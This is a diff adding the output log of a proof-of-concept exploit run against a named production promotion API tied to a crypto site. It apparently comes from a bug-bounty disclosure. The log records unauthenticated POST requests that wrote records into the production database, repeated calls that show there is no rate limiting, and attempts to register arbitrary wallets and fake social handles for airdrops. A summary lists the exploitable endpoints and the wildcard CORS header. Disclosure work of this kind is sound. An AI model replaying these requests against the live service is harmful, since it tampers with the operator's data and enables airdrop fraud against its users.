@@ -1,0 +1,114 @@
+
+==================================================================
+  F4 PoC — Unauthenticated Promotion API (gpromotion-api-prod)
+==================================================================
+[*] Target API : https://gpromotion-api-prod.azurewebsites.net
+[*] Target addr: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+
+==================================================================
+  PRE-CHECK — Swagger UI publicly accessible
+==================================================================
+[+] Swagger UI returns HTTP 200 — full API spec exposed to public
+    URL                            https://gpromotion-api-prod.azurewebsites.net/swagger
+
+==================================================================
+  PHASE 0 — Baseline: read existing attendance records (no auth)
+==================================================================
+[*] GET /api/Attendance/Address/{address} → HTTP 200
+    Existing records count         5
+
+==================================================================
+  PHASE A — Record attendance for target address (no auth, no signature)
+==================================================================
+[*] POST /api/Attendance/0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+[*] No Authorization header. No wallet signature. No API key.
+    HTTP status                    200
+[+] Attendance accepted by production API!
+
+==================================================================
+  PHASE B — Repeat immediately to prove zero rate limiting
+==================================================================
+[*] POST /api/Attendance/0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef (second call, same minute)
+    HTTP status                    200
+[+] Second attendance accepted — no rate limit, no duplicate check!
+
+==================================================================
+  PHASE B — Verify both records written to production database
+==================================================================
+    HTTP status                    200
+    Total records for address      7
+    New records created this run   2
+
+  Record #1:
+    createdDateTime : 2026-06-03T15:06:04.4418484
+    address         : 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+    id              : d88661f9-0b4b-400f-9c22-cfc805ac2a87
+    clusterID       : 4391
+  Record #2:
+    createdDateTime : 2026-06-03T15:06:00.6616334
+    address         : 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+    id              : fa771237-7dba-4993-8772-8cd75e8010b0
+    clusterID       : 4390
+[+] 2 new attendance record(s) confirmed in production DB
+[+] clusterID values are sequential — confirms real production system
+
+==================================================================
+  PHASE C — Register arbitrary address for WadeAirdrop (no ownership proof)
+==================================================================
+[*] POST /api/WadeAirdrop with fake wallet + social IDs
+[*] No signature required — just supply any address and social handles
+
+    stakedAddress                  0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+    twitterID                      fake_bounty_hunter_99999
+    discordHandle                  fakehunter#9999
+    solAddress                     11111111111111111111111111111111
+
+    HTTP status                    400
+    Response body                  "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef already exists"
+[*] WadeAirdrop returned 400 (may enforce additional validation)
+    CheckAddress result            false
+    CheckAddress HTTP              200
+
+==================================================================
+  PHASE D — Register arbitrary address for OOZ NFT (no ownership proof)
+==================================================================
+[*] POST /api/OOZNFT with same fake data
+
+    HTTP status                    400
+    Response body                  "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef already exists"
+[*] OOZNFT returned 400
+    CheckAddress result            false
+    CheckAddress HTTP              200
+
+==================================================================
+  PHASE E — CORS: API callable from any malicious origin
+==================================================================
+    Access-Control-Allow-Origin    *
+[+] CORS wildcard confirmed — POST can be triggered from any website
+
+==================================================================
+  SUMMARY — Vulnerability Confirmed
+==================================================================
+
+  API          : https://gpromotion-api-prod.azurewebsites.net
+  Used by      : https://penguinswap.org (JS bundle reference)
+
+  Confirmed vulnerabilities:
+    1. POST /api/Attendance/{address}  — no auth, no rate limit
+       → Attacker can record attendance for ANY wallet, unlimited times
+       → Production DB confirmed written (clusterID evidence)
+
+    2. POST /api/WadeAirdrop            — no ownership proof
+       → Any wallet/Twitter/Discord can be registered for airdrop
+
+    3. POST /api/OOZNFT                 — no ownership proof
+       → Any wallet can be registered for OOZ NFT drop
+
+    4. GET  /api/Attendance/Address/*   — unauthenticated read
+       → Read any user's attendance history
+
+    5. CORS: Access-Control-Allow-Origin: *
+       → All above exploitable cross-origin from any malicious webpage
+
+
+
